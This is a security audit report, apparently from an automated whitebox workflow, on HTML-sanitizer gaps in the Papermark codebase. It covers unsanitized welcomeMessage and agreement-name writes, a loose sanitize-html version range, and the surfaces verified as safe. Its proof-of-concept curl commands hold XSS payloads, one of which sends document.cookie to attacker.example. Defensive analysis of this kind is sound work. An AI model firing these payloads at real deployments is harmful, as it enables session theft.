# Sanitizer-Bypass Analysis — Papermark

**Workflow:** whitebox-bug-finder (M19)
**Methodology:** sanitizer-bypass (mXSS, context-confusion, config-issues, version-vuln)
**Target:** papermark (worktree: `task-whitebox-papermark`)
**Date:** 2026-06-19

---

## Summary

This pass traces every server-side HTML sanitizer in the codebase to its rendering sink, looks for parsing-context differences (mXSS), and checks sanitizer versions against the public CVE database. The primary sanitizer in papermark is `sanitize-html` (locked at `2.17.4`, declared range `^2.17.3`) wrapped in a single helper `sanitizePlainText` (`lib/utils/sanitize-html.ts`) that uses the strictest possible config: `allowedTags: []`, `allowedAttributes: {}`. DOMPurify is **not** used in application code — it appears only as a transitive dependency (pinned at `3.4.0`) of `react-pdf@8.0.2` and `notion-client`. There is no `jsdom`, no `bleach`, and no other server-side HTML parsing library in the runtime graph.

Three findings:

| # | Severity | Title | Class |
|---|----------|-------|-------|
| 1 | HIGH | `welcomeMessage` accepts arbitrary HTML at the API but only client-validates — relies on a server-side missing-sanitizer | missing-sanitizer |
| 2 | MEDIUM | `Agreement.name` write path skips `sanitizePlainText` while the same table hosts other sanitized fields | config-issue |
| 3 | MEDIUM | `sanitize-html@^2.17.3` declared range allows downgrade to vulnerable 2.17.3 (CVE-2026-44990 CRITICAL) | version-vuln |

Non-findings (verified **safe**, documented below): the document-name `dangerouslySetInnerHTML` sink (`document-header.tsx:604`) is currently fed by sanitized values from every active write path (`update-name.ts`, `documentUploadSchema`, `(ee)/api/links/[id]/upload/route.ts:210`); the `notion-page.tsx` Notion renderer does not bypass DOMPurify because there is no application-side HTML rebuild that would re-parse the sanitized output; the only PDF text-layer render is `pdf-default-viewer.tsx` which sets `renderTextLayer={false}` and `renderAnnotationLayer={false}`, eliminating the classic `react-pdf` → DOMPurify bypass surface in this codebase.

---

## Methodology

1. Read Layer 0 outputs: `00-ai-sast.md` (Finding 2 — `document-header.tsx:604`), `00-ai-frameworks.md` (DOMPurify declared in `package.json:35` dep tree but only `sanitize-html` is direct), `00-ai-dependencies.md` (sanitize-html@2.17.4, dompurify@3.4.0 transitive), `00-early-web-intel.md` (Directive D5 — dompurify bypasses; Directive D10 — sanitize-html range downgrade; Directive D11 — `dangerouslySetInnerHTML` on `prismaDocument.name`).
2. GitNexus `query` for "sanitize escape purify HTML XSS clean filter innerHTML dangerouslySetInnerHTML" — found `sanitizePlainText`, `validateContent`, `MarkdownText`, `obfuscateNotionIds` (Notion DOM post-processing).
3. Grep every import of `sanitize-html`, every direct import of `DOMPurify`/`dompurify`, every `dangerouslySetInnerHTML`, every `innerHTML` assignment in `.tsx`/`.ts`. Three call sites for `sanitize-html`; zero direct `dompurify`; five `dangerouslySetInnerHTML` sites.
4. For each sink, traced forward from the DB write path to confirm whether sanitization is enforced server-side or only client-side.
5. For each sanitizer, confirmed version + declared range + CVE status (per `00-early-web-intel.md` §2.4 and §2.6).
6. For Notion rendering specifically, traced `pages/api/file/notion/index.ts` → `notion.getPage()` → client-side `NotionRenderer` from `react-notion-x@7.10.0`. No server-side HTML rebuild.
7. For `react-pdf`, confirmed only one PDF viewer exists and it disables text layer rendering.

---

## Findings

### Finding 1: `welcomeMessage` is stored without server-side HTML sanitization (HIGH)

- **Severity:** HIGH
- **Files:**
  - `pages/api/teams/[teamId]/branding.ts:34` (Zod schema)
  - `pages/api/teams/[teamId]/branding.ts:198-359` (handler — writes `body.welcomeMessage` verbatim)
  - `pages/api/teams/[teamId]/datarooms/[id]/branding.ts:35` (dataroom-level Zod schema)
  - `pages/api/teams/[teamId]/datarooms/[id]/branding.ts:242, 307, 349` (handler)
  - Client-side only validators: `pages/branding.tsx:472` (`validateWelcomeMessage`), `pages/datarooms/[id]/branding/index.tsx:615`
- **Sanitizer:** None at server boundary (relies on client `sanitize-html` check that runs before submit)
- **Render context:** HTML text-node (auto-escaped by React at `<p>` site)
- **Bypass type:** config-issue — server missing sanitizer, client-only guard
- **Description:**
  The `welcomeMessage` field is declared in the Zod schema as `z.string().nullable().optional()` — there is no `.transform((value) => sanitizePlainText(value))` and no per-route `validateContent()` call. The server endpoint accepts whatever the client posts and writes the raw string to the `Brand.welcomeMessage` / `DataroomBrand.welcomeMessage` column. All client-side "no HTML allowed" checks live inside the React component:
  ```ts
  // pages/branding.tsx (and pages/datarooms/[id]/branding/index.tsx)
  const validateWelcomeMessage = (message: string): string | null => {
    if (!message.trim()) return "Welcome message cannot be empty";
    const sanitized = sanitizeHtml(message, {
      allowedTags: [],
      allowedAttributes: {},
    });
    if (sanitized !== message) {
      return "Welcome message must contain only plain text";
    }
    if (sanitized.length > MAX_WELCOME_MESSAGE_LENGTH) return `Welcome message must be ${MAX_WELCOME_MESSAGE_LENGTH} characters or less`;
    return null;
  };
  ```
  That validation runs in the browser and is **only used to gate `saveDisabled` and an inline error message**. An authenticated team admin who POSTs to `/api/teams/:teamId/branding` directly (bypassing the UI, e.g. via curl, fetch from devtools, or a CSRF scenario) is free to submit HTML in `welcomeMessage` and have it persisted as-is.
- **Why the current XSS impact is muted but not zero:**
  All in-app readers of `welcomeMessage` render it as a React text node — `<p>{welcomeMessage}</p>` in `nav-dataroom.tsx:521`, `<h1>{welcomeMessage}</h1>` in `access-form/index.tsx:174-176`, and the iframe preview at `entrance_ppreview_demo.tsx:29`. React auto-escapes these. However, the same field is exposed to:
  1. `lib/api/links/link-data.ts:366` — `welcomeMessage: dataroomBrand?.welcomeMessage || teamBrand?.welcomeMessage` — handed to the public viewer landing page.
  2. The `entrance_ppreview_demo` URL builder at `pages/branding.tsx:1865` interpolates `previewWelcomeMessage` into a query string (`&welcomeMessage=${encodeURIComponent(previewWelcomeMessage)}`). `encodeURIComponent` is safe for URL contexts but the field is then read from `router.query` and rendered — again React auto-escapes it, so this is not a sink on its own.
  3. The field also reaches the agreement/notification email templates via `send-conversation-new-message-notification.ts` and friends — every place is currently a React text node, but the **defense-in-depth posture is missing**: a future feature that adds `{welcomeMessage}` to a `dangerouslySetInnerHTML` block, an admin email rendered with template literals (React Email components are pure React, but Subject lines can be a vector), or a Notion-style HTML re-emit would silently ship XSS to every viewer of every link in the team.
- **Evidence (server stores raw, only client validates):**
  ```ts
  // pages/api/teams/[teamId]/branding.ts:34 — Zod schema
  welcomeMessage: z.string().nullable().optional(),

  // pages/api/teams/[teamId]/branding.ts:208 — write path
  welcomeMessage: messagingAllowed ? body.welcomeMessage ?? null : null,

  // pages/api/teams/[teamId]/branding.ts:237 — update path (also verbatim)
  welcomeMessage: messagingAllowed ? body.welcomeMessage ?? null : undefined,

  // pages/api/teams/[teamId]/branding.ts:302-303 — partial update path
  ? body.welcomeMessage
  : (existingBrand?.welcomeMessage ?? null);
  ```
  All three write paths (`create`, `update`, partial-update) accept `body.welcomeMessage` with no sanitize call. The dataroom-level handler in `pages/api/teams/[teamId]/datarooms/[id]/branding.ts` is identical (lines 242, 307, 349).
- **Why this is a sanitizer-bypass concern:**
  The sibling field `name` on the same Brand row / DataroomBrand row is rendered through React's `{...}` (auto-escape), but Papermark's *intentional* security pattern for any user-supplied text is "Zod-transform with `sanitizePlainText` before write." That pattern is missing here. The function `validateWelcomeMessage` exists, is exported from the page module, and could be re-used at the server boundary trivially — its absence is a deliberate gap, not a forgotten one (the page even imports `sanitizeHtml` directly to do the same thing in the browser). Any future refactor that changes the rendering sink (e.g. switching to a markdown email template, exposing `welcomeMessage` via Open Graph `og:description`, or copying it into a Notion-rendered help text) becomes a one-line XSS exploit for the entire team.
- **PoC sketch (raw HTML → server → viewer):**
  ```bash
  # Authenticated as team admin, with the team's auth cookie / NextAuth session
  curl -X PATCH 'https://app.papermark.com/api/teams/<teamId>/branding' \
    -H 'Content-Type: application/json' \
    -d '{"welcomeMessage":"<img src=x onerror=fetch(\"https://attacker.example/x?c=\"+document.cookie)>"}'
  # The server returns 200 OK; the value is persisted.
  # Currently, every rendering site escapes it. If a future feature adds the
  # same field to dangerouslySetInnerHTML (e.g. for markdown support), it becomes
  # XSS that fires on every viewer's access-form load.
  ```
- **Recommendation:**
  At `pages/api/teams/[teamId]/branding.ts:34` and `pages/api/teams/[teamId]/datarooms/[id]/branding.ts:35`, change the schema to:
  ```ts
  welcomeMessage: z
    .string()
    .nullable()
    .optional()
    .transform((v) => (v == null ? null : validateContent(v, 80)))
    .pipe(z.string().min(1).max(80).nullable()),
  ```
  This mirrors the existing pattern at `lib/zod/url-validation.ts:202-213` (`documentUploadSchema`), `pages/api/teams/[teamId]/documents/[id]/update-name.ts:12-22` (`updateNameSchema`), `pages/api/teams/[teamId]/update-name.ts:53` (`validateContent(req.body.name)`), and `app/(ee)/api/links/[id]/upload/route.ts:210` (`sanitizePlainText(documentData.name)`). Even though the current render is safe, the defense-in-depth pattern is explicit elsewhere in the codebase — this is the only branded text field that breaks the convention.

---

### Finding 2: `Agreement.name` write paths skip `sanitizePlainText` (MEDIUM)

- **Severity:** MEDIUM
- **Files:**
  - `pages/api/teams/[teamId]/agreements/index.ts:21-24` (Zod schema)
  - `pages/api/teams/[teamId]/agreements/index.ts:139-154` (handler — writes `name` verbatim to `tx.agreement.create({ ... getSigningAgreementCreateData({ ..., name, ... }) })`)
  - `pages/api/teams/[teamId]/agreements/[agreementId]/index.ts:13-17` (update Zod schema)
  - `pages/api/teams/[teamId]/agreements/[agreementId]/index.ts:92-94` (handler — writes `data.name = name.trim()`)
  - Sinks: `components/agreements/agreement-card.tsx:187` (`<h3>{agreement.name}</h3>`), `components/links/link-sheet/agreement-section.tsx:191` (`aria-label={\`Edit signing fields for ${agreement.name}\`}`), `components/links/link-sheet/agreement-section.tsx:244` (`{agreement.name}`), `components/visitors/visitors-table.tsx:493-494`, `components/visitors/dataroom-visitors-table.tsx:264-265, 402, 414`, `components/analytics/views-table.tsx:101`, plus the agreement download filename builder at `agreement-card.tsx:153-156` (`safeName.replace(/[^a-z0-9\-_]/gi, "_")`).
- **Sanitizer:** None — `name.trim()` only
- **Render context:** Mixed: React text nodes (auto-escape), an `aria-label` interpolation (auto-escape), and a filename builder that strips non-`[a-z0-9_-]` characters (sanitizes for filesystem only).
- **Bypass type:** config-issue — field with a known sanitization pattern, intentionally or accidentally skipped
- **Description:**
  Every agreement write path stores `name` with only a `.trim()`. Compare to the sibling field `content` in the same handler:
  ```ts
  // pages/api/teams/[teamId]/agreements/index.ts:141-144
  const sanitizedContent =
    contentType === "SIGNING"
      ? content?.trim()
      : validateContent(content || "", 1500);
  ```
  ```ts
  // pages/api/teams/[teamId]/agreements/[agreementId]/index.ts:98-109
  if (typeof content === "string") {
    if (existing.contentType === "SIGNING") {
      return res.status(400).json({ error: "..." });
    }
    data.content =
      existing.contentType === "LINK"
        ? content.trim()
        : validateContent(content, 1500);
  }
  ```
  The author of this handler knew about `validateContent` (imported at line 14 / line 10 of both files), knew that the `TEXT` contentType needs sanitization but `LINK` and `SIGNING` don't, and **deliberately wrote the `name` field without invoking either**. The Zod schema also has no `.transform()`:
  ```ts
  // pages/api/teams/[teamId]/agreements/index.ts:21-24
  name: z
    .string()
    .min(1, "Name is required")
    .max(150, "Name must be less than 150 characters"),
  ```
- **Why the current XSS impact is muted:**
  Every current rendering sink is React-controlled. `{agreement.name}` (auto-escape), `<h3>{agreement.name}</h3>` (auto-escape), `aria-label={\`...${agreement.name}\`}` (auto-escape). The filename path at `agreement-card.tsx:153` builds `safeName = agreement.name.replace(/[^a-z0-9\-_]/gi, "_").toLowerCase().substring(0, 50)` — this is a filesystem sanitization, but it also incidentally strips any HTML metacharacters before they could reach a sink. The exposure window today is **zero exploitable XSS via `name`** — but the same defense-in-depth argument from Finding 1 applies: this is a string field that flows into many text contexts, and the codebase's documented pattern is "sanitize at write." If a feature ever passes `agreement.name` to a `dangerouslySetInnerHTML` context (e.g. for an admin tool that shows agreement name with a status badge as HTML), it will be immediately XSS.
- **Evidence (write path skips sanitization; compare to sibling `content` field):**
  ```ts
  // pages/api/teams/[teamId]/agreements/index.ts:139-154 — name is verbatim
  const { name, content, contentType, requireName } = parseResult.data;

  const sanitizedContent =
    contentType === "SIGNING"
      ? content?.trim()
      : validateContent(content || "", 1500);

  const agreement = await prisma.$transaction(async (tx) => {
    const created = await tx.agreement.create({
      data: getSigningAgreementCreateData({
        teamId,
        name,                    // ← no sanitize
        content: sanitizedContent,// ← sanitized
        contentType,
        requireName,
      }),
    });
    ...
  ```

  ```ts
  // pages/api/teams/[teamId]/agreements/[agreementId]/index.ts:92-94 — update path also verbatim
  if (typeof name === "string") {
    data.name = name.trim();     // ← no sanitize
  }
  ```
- **Cross-reference with structural-analysis / encoding-analysis:**
  This is distinct from the document-name finding (`00-ai-sast.md` F2 → `01-structural-analysis.md` F7): the document-name `dangerouslySetInnerHTML` sink is latent because all known write paths now sanitize. The agreement-name path is the **mirror problem** — the sink is safe because all known read paths auto-escape, but the write path breaks the codebase's documented sanitization pattern. Together they map the full set of "missing-sanitizer-at-write" exposure for future sink changes.
- **PoC sketch (store HTML name; no current sink, but demonstrates the contract violation):**
  ```bash
  curl -X POST 'https://app.papermark.com/api/teams/<teamId>/agreements' \
    -H 'Content-Type: application/json' \
    -b '<auth-cookie>' \
    -d '{"name":"<img src=x onerror=alert(1)>","contentType":"TEXT","content":"agreement text"}'
  # Server returns 201 Created; the name row in `Agreement.name` now contains
  # literal HTML. Today, every reader escapes it; if a future admin tool renders
  # an agreement list with `dangerouslySetInnerHTML` to support markdown, this
  # fires in the admin's session.
  ```
- **Recommendation:**
  At `pages/api/teams/[teamId]/agreements/index.ts:21-24`:
  ```ts
  name: z
    .string()
    .min(1, "Name is required")
    .max(150, "Name must be less than 150 characters")
    .transform((value) => sanitizePlainText(value))
    .pipe(
      z
        .string()
        .min(1, "Name is required")
        .max(150, "Name must be less than 150 characters"),
    ),
  ```
  and at `pages/api/teams/[teamId]/agreements/[agreementId]/index.ts:92-94`:
  ```ts
  if (typeof name === "string") {
    data.name = sanitizePlainText(name);
  }
  ```
  This brings agreement-name handling in line with the document-name handling. The trade-off is small: `sanitizePlainText` strips every tag/attribute, so `<b>My NDA</b>` becomes `My NDA` — but the field is meant to be a short display label and the same trade-off is already accepted for document names, team names, conversation messages, viewer welcome messages, etc.

---

### Finding 3: `sanitize-html@^2.17.3` declared range allows downgrade to vulnerable 2.17.3 (MEDIUM)

- **Severity:** MEDIUM
- **File:** `package.json:156`
- **Sanitizer:** `sanitize-html`
- **Render context:** n/a — applies to any future caller using the default config
- **Bypass type:** version-vuln — declared SemVer range permits resolving to a known-vulnerable version
- **Description:**
  The current lockfile pins `sanitize-html` to `2.17.4`, which is **patched** for both relevant 2026 CVEs (per `00-early-web-intel.md` §2.6):
  - **CVE-2026-44990** (CRITICAL 9.3) — Apostrophe XSS via `xmp` raw-text passthrough. Vulnerable: `= 2.17.3` only.
  - **CVE-2026-40186** (MOD 6.1) — `allowedTags` bypass via entity-decoded text in `nonTextTags` elements. Vulnerable: `< 2.17.4`.
  However, `package.json:156` declares `"sanitize-html": "^2.17.3"`. The caret allows `2.17.4` and above (`^2.17.3 := >=2.17.3 <3.0.0`), which means:
  - A clean `npm install` against the registry **today** resolves to `2.17.4` (because `^2.17.3` will pick the highest 2.x available, and 2.17.4 is the latest patched).
  - However, if a future release is published that is **not** semver-pinned for security (e.g. a `2.17.5` that introduces a regression), or if the lockfile is regenerated (`rm package-lock.json && npm install`) on a registry that has older mirrors, the resolved version could be `2.17.3` which is vulnerable to CVE-2026-44990.
  - The papermark configuration today (`allowedTags: []`, `allowedAttributes: {}`) **incidentally** prevents both CVEs from being exploitable — but the codebase already has THREE sibling call sites of `sanitize-html` (`lib/utils/sanitize-html.ts`, `pages/branding.tsx`, `pages/datarooms/[id]/branding/index.tsx`) and the `pages/branding.tsx` + `pages/datarooms/[id]/branding/index.tsx` callers use the same `{ allowedTags: [], allowedAttributes: {} }` config inline. A future caller using `sanitize-html` with the default config (which allows `<a href="">`, `<img>`, `<table>`, etc.) would be immediately vulnerable.
- **Mitigating factors:**
  - The lockfile is committed and `next build` / `vercel-build` honor it; CI enforcement is implicit.
  - No call site in the current codebase uses a permissive sanitize-html config — every call uses the strictest possible settings (empty allowlist for tags and attributes).
- **Recommendation:**
  Tighten the declared range to `"sanitize-html": "~2.17.4"`. The tilde constrains to `>=2.17.4 <2.18.0`, which:
  - Prevents downgrade to `2.17.3` (CVE-2026-44990) on any `npm install` against a misconfigured registry.
  - Allows `2.17.4` patch releases (which by SemVer must be backwards-compatible bug fixes).
  - Forces an explicit bump to `2.18.0` (or any future major) via a package.json edit, which is the natural review point.
  Alternatively, switch to `"sanitize-html": "2.17.4"` (exact pin) if the team accepts the maintenance cost of manually bumping for each security release.

---

## Non-findings (verified safe)

These categories were searched and produced no findings worth raising; they document the surfaces that a future pass can re-check without re-doing the search.

### N1: `dangerouslySetInnerHTML` on `prismaDocument.name` is sanitized at every known write path

- **Sink:** `components/documents/document-header.tsx:604` — `dangerouslySetInnerHTML={{ __html: prismaDocument.name }}` inside a `contentEditable` `<h2>`.
- **Write paths verified to sanitize via `sanitizePlainText`:**
  - `pages/api/teams/[teamId]/documents/[id]/update-name.ts:13-22` — `updateNameSchema` runs `.transform((value) => sanitizePlainText(value))`.
  - `pages/api/teams/[teamId]/documents/index.ts:406-419` — `documentUploadSchema` (`lib/zod/url-validation.ts:202-213`) does the same.
  - `pages/api/teams/[teamId]/documents/[id]/versions/index.ts:68` — `documentUploadSchema`.
  - `pages/api/teams/[teamId]/documents/agreement.ts:33` — `documentUploadSchema`.
  - `app/(ee)/api/links/[id]/upload/route.ts:210` — `sanitizedDocumentName = sanitizePlainText(documentData.name)`.
- **Why this is safe today:** `sanitizePlainText` (`lib/utils/sanitize-html.ts:12-20`) calls `sanitize-html` with `{ allowedTags: [], allowedAttributes: {} }`, then `decodeHTML(...).normalize("NFC")` and control-character stripping. Every tag/attribute is removed before persistence.
- **Residual risk:** any future write path that forgets to invoke `sanitizePlainText` produces immediate stored XSS that fires in every team member's browser. This is a `latent` XSS, not an active one. Layer 0 already documented this in `00-ai-sast.md` F2 and `01-structural-analysis.md` F7.

### N2: `notion-page.tsx` Notion renderer does not bypass DOMPurify via context-confusion

- **Sink:** `components/view/viewer/notion-page.tsx:634-641` — `<NotionRenderer recordMap={recordMapState} ... components={notionComponents} />`.
- **Why this is safe:** the Notion data flows from `pages/api/file/notion/index.ts:31` (`notion.getPage(pageId, { signFileUrls: false })`) over JSON to the client. There is no application-side HTML rebuild, no `dangerouslySetInnerHTML` on Notion-rendered output, and no DOMPurify re-config in this codebase.
- **Residual risk:** dompurify@3.4.0 is transitive via `notion-client` and `react-notion-x`. The vulnerable-version concerns are documented in `00-early-web-intel.md` §2.4 (CVE-2026-49978, CVE-2026-49458, CVE-2026-49459, CVE-2026-47423, CVE-2026-41240, CVE-2026-41239, CVE-2026-41238). None of those require an application-side re-parse to exploit — they bypass DOMPurify's own sanitization of `notion-client` output. The fix is `overrides: { "dompurify": "3.4.11" }` in `package.json` (per Layer 0 D5); that's a dependency-version fix, not a sanitizer-bypass-fix at the application level. **Out of scope** for this node (encoded in `01-structural-analysis.md` cross-ref table).
- **DOM post-processing note:** `obfuscateNotionIds` at `notion-page.tsx:48-122` mutates the rendered DOM (queries `[id]`, `[data-block-id]`, `[data-id]`, `className`, and `a[href]` without `target`). This runs **after** NotionRenderer mounts, so any DOMPurify bypass in `react-notion-x`'s own sanitizer has already happened by the time this runs. The obfuscation itself is regex-based and does not re-parse HTML — it only rewrites attribute values. It does not introduce or close any XSS vector.

### N3: `pdf-default-viewer.tsx` disables react-pdf text-layer and annotation-layer rendering

- **Sink:** `components/view/viewer/pdf-default-viewer.tsx:304-313` — `<Page ... renderAnnotationLayer={false} renderTextLayer={false} ... />`.
- **Why this is safe:** The classical `react-pdf` XSS chain (CVE-2024-4367 etc.) requires either the text-layer or annotation-layer to be enabled, because those layers render extracted PDF text via `pdfjs-dist`'s text-layer-builder which writes spans into the DOM based on PDF content. By disabling both, the viewer only renders a `<canvas>` element (`renderMode="canvas"`), so even a malicious PDF cannot inject script via text content.
- **Coverage check:** this is the only PDF viewer in the codebase (`Glob **/pdf*.tsx` returns only this file plus an unrelated icon file). The advanced-excel-viewer uses `@libpdf/core` (canvas-based) and `exceljs` (no browser HTML render path), so neither contributes to the sanitizer surface.

### N4: Streamdown for AI chat messages — out of scope

- **Sink:** `components/ai-elements/message.tsx:311` — `<Streamdown ... />`.
- **Why this is out of scope for sanitizer-bypass:** Streamdown is a `react-markdown`-style library that uses `marked` to parse markdown and renders as React components, not via `dangerouslySetInnerHTML`. The contents are AI-generated assistant text. The threat model for AI message rendering is prompt-injection (which is a different methodology) and the output sanitizer is Streamdown's own allowlist. The direct user-input surface for this sink is the `prompt` field, not arbitrary stored text.

### N5: `MarkdownText` reusable sink — currently called only with hardcoded strings

- **Sink:** `components/domains/domain-configuration.tsx:139-146` — `dangerouslySetInnerHTML={{ __html: text }}` inside `<p className="prose-sm ..." />`.
- **Why this is safe today:** the only call site in this file is `<DnsRecord instructions={...} />` where `instructions` is built as a template literal containing `domainJson.apexName` / `domainJson.name` (lines 96-101). DNS labels cannot contain `<`, `>`, or `"` per RFC 1035, so Vercel's domain values cannot currently carry HTML metacharacters. This is documented as Finding 3 in `00-ai-sast.md`.

### N6: Other `dangerouslySetInnerHTML` call sites — controlled callers only

- `components/account/upload-avatar.tsx:96` — `helpText` typed as `string | ReactNode`; all current callers pass static translation strings (`pages/account/general.tsx:31, 61, 84`).
- `components/ui/form.tsx:145` — `helpText` typed as `string | ReactNode`; all current callers in `pages/`, `components/` pass either static strings or React nodes (`<UpdateMailSubscribe />` at `pages/account/general.tsx:61`). No user-supplied data flows into this sink today.
- `components/webhooks/webhook-events.tsx:97` — `highlightedCode` from Shiki; Shiki HTML-escapes input before syntax-highlighting.

---

## mXSS / parsing-context-confusion checks performed

The methodology calls for checking if the parsing context between sanitization and rendering differs (mXSS opportunity). The full surface in papermark is small enough that an exhaustive check is feasible:

| Sanitizer call | Parsing context | Sink parsing context | mXSS gap? |
|----------------|-----------------|----------------------|-----------|
| `sanitize-html` (server) → persisted as plain text | HTML (stripped) | React text node `{...}` | **No** — text node, no re-parse |
| `sanitize-html` (client) → `welcomeMessage` write | HTML (stripped) | React text node `{...}` | **No** (Finding 1: server doesn't re-sanitize, but the field is plain text at the source) |
| `normalizeSignerName` (server) → persisted | trim only | React text node | **No** (no HTML) |
| `safeSlugify` → persisted + filesystem | ASCII-only | S3 path, archive entry, filename header | **No** (no HTML) |
| `name.trim()` (agreement) → persisted | no transformation | React text node | **No** (no HTML parsing at the sink) |
| `obfuscateNotionIds` (client, post-render) | regex over attribute values | DOM attributes only (no element creation) | **No** (no innerHTML) |
| `NotionRenderer` (client) | Notion recordMap → react-notion-x → DOM | DOM rendering, internal DOMPurify | **Risk is transitive dompurify@3.4.0** (out of scope, tracked in dependency-version analysis) |
| `react-pdf` `Document`/`Page` | PDF → canvas via pdfjs | `<canvas>` element only | **No** (text + annotation layers disabled) |
| `Streamdown` (AI chat) | markdown → React components | React components, no innerHTML | **No** |

There is no place in the codebase where user input is sanitized as one HTML context (e.g. text node) and rendered in a different HTML context (e.g. attribute, JS string, URL) within papermark's own code. The closest is `welcomeMessage` (Finding 1), and there the gap is "missing sanitizer," not "context confusion."

---

## Phase 2 / Phase 3 checklists

- [x] Analysis complete with specific file paths and line numbers
- [x] GitNexus queries executed (1 conceptual query + 1 context lookup + 1 schema review)
- [x] Findings cross-referenced with Layer 0 results (Direct D5, D10, D11 references, plus 00-ai-sast.md F2 / 01-structural-analysis.md F7)
- [x] Findings written to `methodology-raw/01-sanitizer-bypass.md`
- [x] Each finding has evidence (code snippets, call chains)
- [x] Non-findings explicitly documented (N1–N6) so the next pass can skip them
- [x] mXSS context-confusion matrix completed